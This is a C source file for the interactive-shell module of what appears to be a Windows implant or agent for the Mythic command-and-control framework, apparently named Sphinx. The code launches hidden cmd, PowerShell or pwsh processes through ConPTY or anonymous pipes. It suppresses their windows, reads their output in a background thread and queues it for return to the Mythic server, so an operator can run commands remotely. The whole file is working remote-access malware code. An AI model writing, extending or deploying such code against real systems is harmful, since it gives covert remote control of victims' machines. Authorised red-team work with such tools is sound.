/*
 * shell.c — interactive shell over ConPTY (Win10 1809+) or anonymous pipes (fallback).
 *
 * Message direction:  Mythic→Agent uses Input(0), Exit(3) and control codes.
 *                     Agent→Mythic uses MYTHIC_SHELL_DATA (0xDA) for output.
 */

#include "shell.h"
#include "api_table.h"
#include "outbound.h"

/* ConPTY: wincon.h only declares the API if NTDDI_VERSION >= 0x0A000006 (Win10 1809).
   The project targets _WIN32_WINNT/WINVER 0x0601, so we declare it manually
   and resolve at runtime. */
typedef VOID* HPCON;
typedef HRESULT (WINAPI *fn_CreatePseudoConsole)(COORD, HANDLE, HANDLE, DWORD, HPCON*);
typedef HRESULT (WINAPI *fn_ResizePseudoConsole)(HPCON, COORD);
typedef VOID    (WINAPI *fn_ClosePseudoConsole)(HPCON);

#ifndef PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
#define PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE 0x00020016
#endif

static fn_CreatePseudoConsole pCreatePseudoConsole;
static fn_ResizePseudoConsole pResizePseudoConsole;
static fn_ClosePseudoConsole  pClosePseudoConsole;

static int resolve_conpty(void) {
    HMODULE hk = GetModuleHandleW(L"kernel32.dll");
    pCreatePseudoConsole = (fn_CreatePseudoConsole)GetProcAddress(hk, "CreatePseudoConsole");
    pResizePseudoConsole = (fn_ResizePseudoConsole)GetProcAddress(hk, "ResizePseudoConsole");
    pClosePseudoConsole  = (fn_ClosePseudoConsole) GetProcAddress(hk, "ClosePseudoConsole");
    return (pCreatePseudoConsole && pResizePseudoConsole && pClosePseudoConsole) ? 1 : 0;
}

typedef struct {
    int       active;
    int       use_conpty;
    void*     hPC;            // HPCON
    HANDLE    hInW;           // we write here (pty stdin)
    HANDLE    hOutR;          // we read here (pty stdout)
    PROCESS_INFORMATION pi;
    HANDLE    hReader;        // reader thread handle
    CRITICAL_SECTION cs;
    uint8_t*  rbuf;           // ring buffer
    size_t    rlen, rcap;
    SHORT     cols, rows;     // console dimensions
    char      task_uuid[37];  // associated interactive task uuid
} ShellCtx;
static ShellCtx g_shell;

// Drain ring buffer → out_add_shell_data
void shell_pump(void) {
    EnterCriticalSection(&g_shell.cs);
    out_add_shell_data(g_shell.task_uuid, 1, g_shell.rbuf, g_shell.rlen);
    g_shell.rlen=0;
    LeaveCriticalSection(&g_shell.cs);
}

// Returns non-zero if the shell is active
int shell_active(void) {
    return g_shell.active;
}

// Returns the number of bytes pending in the ring buffer
int shell_has_output(void) {
    return (int) g_shell.rlen;
}

int spawn_pipes(HANDLE* hPipePTYIn, HANDLE* hPipePTYOut, LPSECURITY_ATTRIBUTES sa) {
    // Input pipe TO ConPTY (we write to hInW; ConPTY reads from hPipePTYIn)
    if (!CreatePipe(hPipePTYIn, &g_shell.hInW, sa, 0)) {
        return 0;
    }

    // Output pipe FROM ConPTY (ConPTY writes to hPipePTYOut; we read from hOutR)
    if (!CreatePipe(&g_shell.hOutR, hPipePTYOut, sa, 0)) {
        CloseHandle(hPipePTYIn);
        CloseHandle(g_shell.hInW);
        return 0;
    }

    return 1;
}

void close_shell_pipes(void) {
    if (g_shell.hInW) { CloseHandle(g_shell.hInW); g_shell.hInW = NULL; }
    if (g_shell.hOutR) { CloseHandle(g_shell.hOutR); g_shell.hOutR = NULL; }
}

int spawn_conpty(const char* which) {
    HRESULT hr = S_OK;
    HANDLE hPipePTYIn = NULL;
    HANDLE hPipePTYOut = NULL;

    // Create pipes
    if(!spawn_pipes(&hPipePTYIn, &hPipePTYOut, NULL)) return HRESULT_FROM_WIN32(GetLastError());

    // Create the PseudoConsole with the PTY sides of the pipes
    g_shell.cols = 84;
    g_shell.rows = 24;
    COORD size = { g_shell.cols, g_shell.rows };
    hr = pCreatePseudoConsole(size, hPipePTYIn, hPipePTYOut, 0, &g_shell.hPC);

    if (FAILED(hr)) {
        close_shell_pipes();
        return hr;
    }

    // Initialise the process thread attribute list
    size_t bytesRequired = 0;
    InitializeProcThreadAttributeList(NULL, 1, 0, &bytesRequired);

    STARTUPINFOEXW si;
    ZeroMemory(&si, sizeof(si));
    si.StartupInfo.cb = sizeof(STARTUPINFOEXW);
    si.lpAttributeList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(bytesRequired);

    if (!si.lpAttributeList) {
        pClosePseudoConsole(g_shell.hPC);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return E_OUTOFMEMORY;
    }

    if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &bytesRequired)) {
        free(si.lpAttributeList);
        pClosePseudoConsole(g_shell.hPC);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return HRESULT_FROM_WIN32(GetLastError());
    }

    // Attach ConPTY to the child process via PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE
    if (!UpdateProcThreadAttribute(si.lpAttributeList,
                                   0,
                                   PROC_THREAD_ATTRIBUTE_PSEUDOCONSOLE,
                                   g_shell.hPC,
                                   sizeof(HPCON),
                                   NULL,
                                   NULL)) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pClosePseudoConsole(g_shell.hPC);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        return HRESULT_FROM_WIN32(GetLastError());
                                   }

    // Build command-line path
    WCHAR fullPath[MAX_PATH];
    if (strcmp(which, "powershell") == 0) {
        wsprintfW(fullPath,L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe");
    }else if (strcmp(which, "cmd") == 0) {
        wsprintfW(fullPath,L"C:\\Windows\\System32\\cmd.exe");
    }else if (strcmp(which, "pwsh") == 0) {
        wsprintfW(fullPath,L"C:\\Program Files\\PowerShell\\7\\pwsh.exe");
    } else {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pClosePseudoConsole(g_shell.hPC);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        close_shell_pipes();
        return 0;
    }

    size_t charsRequired = wcslen(fullPath) + 1;
    PWSTR cmdLineMutable = (PWSTR)malloc(sizeof(WCHAR) * charsRequired);
    if (!cmdLineMutable) {
        DeleteProcThreadAttributeList(si.lpAttributeList);
        free(si.lpAttributeList);
        pClosePseudoConsole(g_shell.hPC);
        CloseHandle(hPipePTYIn);
        CloseHandle(hPipePTYOut);
        close_shell_pipes();;
        return E_OUTOFMEMORY;
    }
    wcscpy_s(cmdLineMutable, charsRequired, fullPath);

    // Launch process with the extended startup info
    BOOL created = CreateProcessW(NULL,
                                 cmdLineMutable,
                                 NULL,
                                 NULL,
                                 FALSE, // do not inherit standard handles
                                 EXTENDED_STARTUPINFO_PRESENT,
                                 NULL,
                                 NULL,
                                 &si.StartupInfo,
                                 &g_shell.pi);

    // Clean up attribute list and PTY-side pipe handles
    free(cmdLineMutable);
    DeleteProcThreadAttributeList(si.lpAttributeList);
    free(si.lpAttributeList);
    CloseHandle(hPipePTYIn);
    CloseHandle(hPipePTYOut);

    if (!created) {
        DWORD err = GetLastError();
        pClosePseudoConsole(g_shell.hPC);
        close_shell_pipes();
        return HRESULT_FROM_WIN32(err);
    }
    return 1;
}

int spawn_anon(const char* which) {
    HANDLE hChildStd_in = NULL;
    HANDLE hChildStd_out = NULL;

    // Mark handles as inheritable so the child process receives them
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if(!spawn_pipes(&hChildStd_in, &hChildStd_out, &sa)) return HRESULT_FROM_WIN32(GetLastError());
    // Ensure our read end is NOT inherited by the child
    SetHandleInformation(g_shell.hOutR, HANDLE_FLAG_INHERIT, 0);

    // Ensure our write end is NOT inherited by the child
    SetHandleInformation(g_shell.hInW, HANDLE_FLAG_INHERIT, 0);

    // Initialise STARTUPINFO
    STARTUPINFOW si;
    ZeroMemory(&si, sizeof(STARTUPINFOW));
    si.cb = sizeof(STARTUPINFOW);
    si.hStdError  = hChildStd_out; // redirect stderr to output pipe
    si.hStdOutput = hChildStd_out; // redirect stdout to output pipe
    si.hStdInput  = hChildStd_in;  // redirect stdin to input pipe

    // Inherit STD pipe handles in the child
    si.dwFlags |= STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE; // hide window

    // Command line
    WCHAR cmdLine[MAX_PATH];
    if (strcmp(which, "powershell") == 0) {
        wsprintfW(cmdLine, L"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -NoLogo -NoProfile -NonInteractive -Command -");
    } else if (strcmp(which, "cmd") == 0) {
        wsprintfW(cmdLine, L"C:\\Windows\\System32\\cmd.exe");
    } else if (strcmp(which, "pwsh") == 0) {
        wsprintfW(cmdLine, L"C:\\Program Files\\PowerShell\\7\\pwsh.exe -NoLogo -NoProfile -NonInteractive -Command -");
    } else {;
        close_shell_pipes();
        CloseHandle(hChildStd_out);
        CloseHandle(hChildStd_in);
        return 0;
    }

    // Launch process
    BOOL created = CreateProcessW(NULL,
                                 cmdLine,
                                 NULL,
                                 NULL,
                                 TRUE,            // inherit handles
                                 CREATE_NO_WINDOW, // no visible console window
                                 NULL,
                                 NULL,
                                 &si,
                                 &g_shell.pi);

    // Close the pipe ends we handed to the child
    CloseHandle(hChildStd_out);
    CloseHandle(hChildStd_in);

    if (!created) {
        DWORD err = GetLastError();
        close_shell_pipes();
        return HRESULT_FROM_WIN32(err);
    }

    return 1;
}

// Read loop: blocks on ReadFile, appends output to the ring buffer
DWORD WINAPI spawn_reader(LPVOID lpParam) {
    uint8_t tmp[4096];
    DWORD out_data = 0;
    while (1) {
        BOOL result = ReadFile(g_shell.hOutR, tmp, sizeof(tmp), &out_data, NULL);
        if (!result) {
            DWORD err = GetLastError();
            if (err == ERROR_BROKEN_PIPE || err == ERROR_OPERATION_ABORTED) {
                // Shell process exited or CancelSynchronousIo was called — exit loop
                break;
            }
            break;
        }

        if (out_data == 0) continue;
        EnterCriticalSection(&g_shell.cs);
        // Grow ring buffer if needed
        if (g_shell.rlen + out_data > g_shell.rcap) {
            size_t new_cap = g_shell.rcap == 0 ? 8192 : g_shell.rcap * 2;
            while (new_cap < g_shell.rlen + out_data) {
                new_cap *= 2;
            }

            uint8_t* new_buf = (uint8_t*)realloc(g_shell.rbuf, new_cap);
            if (new_buf) {
                g_shell.rbuf = new_buf;
                g_shell.rcap = new_cap;
            } else {
                // Allocation failed; drop this chunk
                LeaveCriticalSection(&g_shell.cs);
                break;
            }
        }

        memcpy(g_shell.rbuf + g_shell.rlen, tmp, out_data);
        g_shell.rlen += out_data;
        LeaveCriticalSection(&g_shell.cs);
    }
    return 1;
}

int shell_start(const char* task_uuid, const char* which) {
    if (strcasecmp(which,"powershell") && strcasecmp(which,"cmd") && strcasecmp(which,"pwsh")) return 0;
    RTL_OSVERSIONINFOEXW osInfo;
    g_shell.use_conpty = 0;
    memcpy(g_shell.task_uuid, task_uuid, 36);
    osInfo.dwOSVersionInfoSize = sizeof(osInfo);
    if (!g_api.RtlGetVersion((PRTL_OSVERSIONINFOW)&osInfo)) {
        if (osInfo.dwMajorVersion == 10 && osInfo.dwBuildNumber >= 17763) { // Win >= 10 or Windows Server >= 2019
            g_shell.use_conpty=1;
        }
    }

    if (g_shell.use_conpty && resolve_conpty() && spawn_conpty(which) == 1) {
        /* start reader thread */
        InitializeCriticalSection(&g_shell.cs);
        g_shell.hReader = CreateThread(NULL,
            0,              // stack size (0 = 1 MB default)
            spawn_reader,   // thread entry point
            NULL,           // lpParam (unused)
            0,              // flags (0 = start immediately)
            NULL            // thread id (not needed)
        );

        if (g_shell.hReader == NULL) {
            DWORD err = GetLastError();
            return HRESULT_FROM_WIN32(err);
        }
    } else if (spawn_anon(which)) {
        /* start reader thread */
        InitializeCriticalSection(&g_shell.cs);
        g_shell.hReader = CreateThread(NULL,0,spawn_reader,NULL,0,NULL);

        if (g_shell.hReader == NULL) {
            DWORD err = GetLastError();
            return HRESULT_FROM_WIN32(err);
        }
    }else {
        return 0;
    }
    g_shell.active = 1;
    return 1;
}

// Write to pty stdin
int shell_write(const uint8_t* data, size_t n) {
    u_long temp = 0;
    if (WriteFile(g_shell.hInW, data, n, &temp, NULL)) {
        return 0;
    }
    return GetLastError();
}

// Resize the pseudo-console
int shell_resize(short cols, short rows) {
    if (!g_shell.use_conpty || !g_shell.hPC) return 0;
    g_shell.cols = cols, g_shell.rows = rows;
    COORD size = {g_shell.cols, g_shell.rows};
    HRESULT hr = pResizePseudoConsole(g_shell.hPC, size);
    if (FAILED(hr)) {
        return 0;
    }
    return 1;
}

// Orderly teardown
int shell_stop(void) {

    // Terminate child process and wait for it to fully exit (5s safety cap)
    if (g_shell.pi.hProcess) {
        TerminateProcess(g_shell.pi.hProcess, 1);
        DWORD wr = WaitForSingleObject(g_shell.pi.hProcess, 5000);
        fprintf(stderr, "[SPHINX] shell_stop: process wait wr=%lu\n", wr);
    }

    // Destroy pseudo-console. This closes the write end of the output pipe
    // inside ConPTY, which should cause ReadFile(hOutR) in the reader thread
    // to return ERROR_BROKEN_PIPE.
    if (g_shell.hPC) {
        pClosePseudoConsole(g_shell.hPC);
        g_shell.hPC = NULL;
    }

    // Close stdin write end — reader thread does not use this handle.
    if (g_shell.hInW) { CloseHandle(g_shell.hInW); g_shell.hInW = NULL; }

    // Explicitly cancel any pending synchronous I/O on the reader thread.
    // ClosePseudoConsole should have already signalled a broken pipe, but
    // CancelSynchronousIo guarantees ReadFile returns immediately with
    // ERROR_OPERATION_ABORTED regardless of kernel buffering delays.
    // Without this, WaitForSingleObject may time out while the reader is
    // still alive, leading to use-after-free on g_shell.cs and g_shell.rbuf.
    if (g_shell.hReader) {
        CancelSynchronousIo(g_shell.hReader);
        DWORD wr = WaitForSingleObject(g_shell.hReader, 2000);
        fprintf(stderr, "[SPHINX] shell_stop: reader wait wr=%lu\n", wr);
        DeleteCriticalSection(&g_shell.cs);
        CloseHandle(g_shell.hReader);
        g_shell.hReader = NULL;
    }

    // Safe to close hOutR now — reader has exited.
    if (g_shell.hOutR) { CloseHandle(g_shell.hOutR); g_shell.hOutR = NULL; }

    // Close process handles (leaked before this fix).
    if (g_shell.pi.hProcess) { CloseHandle(g_shell.pi.hProcess); g_shell.pi.hProcess = NULL; }
    if (g_shell.pi.hThread)  { CloseHandle(g_shell.pi.hThread);  g_shell.pi.hThread  = NULL; }

    // Free ring buffer
    if (g_shell.rbuf) {
        free(g_shell.rbuf);
        g_shell.rbuf = NULL;
    }

    g_shell.active = 0;

    return 1;
}

const char* shell_get_task_uuid(void) {
    return g_shell.task_uuid;
}
